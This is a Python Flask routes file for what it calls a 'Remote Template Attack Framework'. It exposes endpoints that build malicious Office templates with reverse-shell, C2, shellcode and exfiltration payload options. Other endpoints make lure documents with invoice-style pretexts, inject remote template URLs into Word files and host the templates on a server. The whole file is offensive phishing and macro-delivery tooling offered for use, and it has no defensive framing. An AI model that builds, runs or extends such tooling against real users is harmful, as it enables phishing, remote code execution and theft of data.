"""
Flask routes for Office Template Injection Engine
Remote Template Attack Framework
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import sys
import os
import io
import tempfile

# Add tools directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

from office_template_injector import (
    get_injector, DocumentType, PayloadType, InjectionMethod
)

office_template_bp = Blueprint('office_template', __name__, url_prefix='/office-template')


@office_template_bp.route('/')
def index():
    """Office Template Injection main page"""
    injector = get_injector()
    stats = injector.get_stats()
    templates = injector.get_templates()
    documents = injector.get_documents()
    
    return render_template('office_template.html',
                           stats=stats,
                           templates=templates[:20],
                           documents=documents[:20],
                           document_types=[d.value for d in DocumentType],
                           payload_types=[p.value for p in PayloadType],
                           injection_methods=[i.value for i in InjectionMethod],
                           pretexts=list(injector.DOCUMENT_PRETEXTS.keys()))


@office_template_bp.route('/api/create-template', methods=['POST'])
def create_template():
    """Create a malicious Office template"""
    try:
        data = request.get_json()
        name = data.get('name', 'MaliciousTemplate')
        doc_type = data.get('doc_type', 'word')
        payload_type = data.get('payload_type', 'reverse_shell')
        custom_payload = data.get('custom_payload')
        
        # Payload parameters
        payload_params = {}
        for key in ['payload', 'host', 'port', 'c2_url', 'interval', 'payload_url',
                    'shellcode_b64', 'exfil_url']:
            if key in data:
                payload_params[key] = data[key]
        
        injector = get_injector()
        template = injector.create_malicious_template(
            name=name,
            doc_type=DocumentType(doc_type),
            payload_type=PayloadType(payload_type),
            payload_params=payload_params,
            custom_payload=custom_payload
        )
        
        return jsonify({
            'success': True,
            'template_id': template.template_id,
            'name': template.name,
            'doc_type': template.doc_type.value,
            'payload_type': template.payload_type.value,
            'payload_preview': template.payload[:200] + '...' if len(template.payload) > 200 else template.payload
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/create-document', methods=['POST'])
def create_document():
    """Create a clean document with pretext"""
    try:
        data = request.get_json()
        pretext = data.get('pretext', 'invoice')
        doc_type = data.get('doc_type', 'word')
        
        # Pretext parameters
        pretext_params = {}
        for key in ['invoice_num', 'name', 'quarter', 'year']:
            if key in data:
                pretext_params[key] = data[key]
        
        injector = get_injector()
        
        # Create temp file
        with tempfile.NamedTemporaryFile(delete=False, suffix='.docx') as f:
            output_path = f.name
        
        doc_path = injector.create_clean_document(
            pretext=pretext,
            doc_type=DocumentType(doc_type),
            output_path=output_path,
            **pretext_params
        )
        
        # Read and return document
        with open(doc_path, 'rb') as f:
            doc_content = f.read()
        
        import base64
        os.unlink(doc_path)
        
        return jsonify({
            'success': True,
            'filename': os.path.basename(doc_path),
            'content_b64': base64.b64encode(doc_content).decode(),
            'size': len(doc_content)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/inject-template', methods=['POST'])
def inject_template():
    """Inject remote template into a document"""
    try:
        data = request.get_json()
        template_url = data.get('template_url')
        doc_type = data.get('doc_type', 'word')
        
        # Document can be provided as base64 or created fresh
        doc_b64 = data.get('document_b64')
        pretext = data.get('pretext')
        pretext_params = data.get('pretext_params', {})
        
        if not template_url:
            return jsonify({'success': False, 'error': 'template_url required'}), 400
        
        injector = get_injector()
        
        # Create input document
        with tempfile.NamedTemporaryFile(delete=False, suffix='.docx') as f:
            input_path = f.name
        
        if doc_b64:
            import base64
            doc_content = base64.b64decode(doc_b64)
            with open(input_path, 'wb') as f:
                f.write(doc_content)
        else:
            # Create clean document
            injector.create_clean_document(
                pretext=pretext or 'invoice',
                doc_type=DocumentType(doc_type),
                output_path=input_path,
                **pretext_params
            )
        
        # Create output path
        with tempfile.NamedTemporaryFile(delete=False, suffix='_injected.docx') as f:
            output_path = f.name
        
        # Inject template
        injected = injector.inject_remote_template(
            input_file=input_path,
            template_url=template_url,
            output_file=output_path,
            doc_type=DocumentType(doc_type)
        )
        
        # Read injected document
        with open(output_path, 'rb') as f:
            injected_content = f.read()
        
        import base64
        os.unlink(input_path)
        os.unlink(output_path)
        
        return jsonify({
            'success': True,
            'doc_id': injected.doc_id,
            'name': injected.name,
            'template_url': injected.template_url,
            'injection_method': injected.injection_method.value,
            'content_b64': base64.b64encode(injected_content).decode(),
            'size': len(injected_content)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/download-template/<template_id>')
def download_template(template_id):
    """Download a malicious template file"""
    try:
        injector = get_injector()
        
        # Export to temp file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            output_path = f.name
        
        exported = injector.export_template(template_id, output_path)
        
        if not exported:
            return jsonify({'success': False, 'error': 'Template not found'}), 404
        
        with open(exported, 'rb') as f:
            content = f.read()
        
        os.unlink(exported)
        
        return send_file(
            io.BytesIO(content),
            mimetype='application/octet-stream',
            as_attachment=True,
            download_name=os.path.basename(exported)
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/start-server', methods=['POST'])
def start_server():
    """Start template hosting server"""
    try:
        data = request.get_json() or {}
        host = data.get('host', '0.0.0.0')
        port = data.get('port', 8888)
        
        injector = get_injector()
        injector.start_template_server(host=host, port=port)
        
        return jsonify({
            'success': True,
            'message': f'Server started on http://{host}:{port}',
            'host': host,
            'port': port
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/stop-server', methods=['POST'])
def stop_server():
    """Stop template hosting server"""
    try:
        injector = get_injector()
        injector.stop_template_server()
        
        return jsonify({
            'success': True,
            'message': 'Server stopped'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@office_template_bp.route('/api/templates')
def list_templates():
    """List all templates"""
    injector = get_injector()
    templates = injector.get_templates()
    return jsonify({'success': True, 'templates': templates})


@office_template_bp.route('/api/documents')
def list_documents():
    """List all injected documents"""
    injector = get_injector()
    documents = injector.get_documents()
    return jsonify({'success': True, 'documents': documents})


@office_template_bp.route('/api/pretexts')
def list_pretexts():
    """List available document pretexts"""
    injector = get_injector()
    return jsonify({
        'success': True,
        'pretexts': [
            {'key': k, 'title': v['title'], 'content': v['content']}
            for k, v in injector.DOCUMENT_PRETEXTS.items()
        ]
    })


@office_template_bp.route('/api/payload-templates')
def list_payload_templates():
    """List available VBA macro templates"""
    injector = get_injector()
    return jsonify({
        'success': True,
        'templates': [
            {'type': p.value, 'name': p.name}
            for p in PayloadType
        ]
    })


@office_template_bp.route('/api/stats')
def get_stats():
    """Get engine statistics"""
    injector = get_injector()
    return jsonify({'success': True, 'stats': injector.get_stats()})
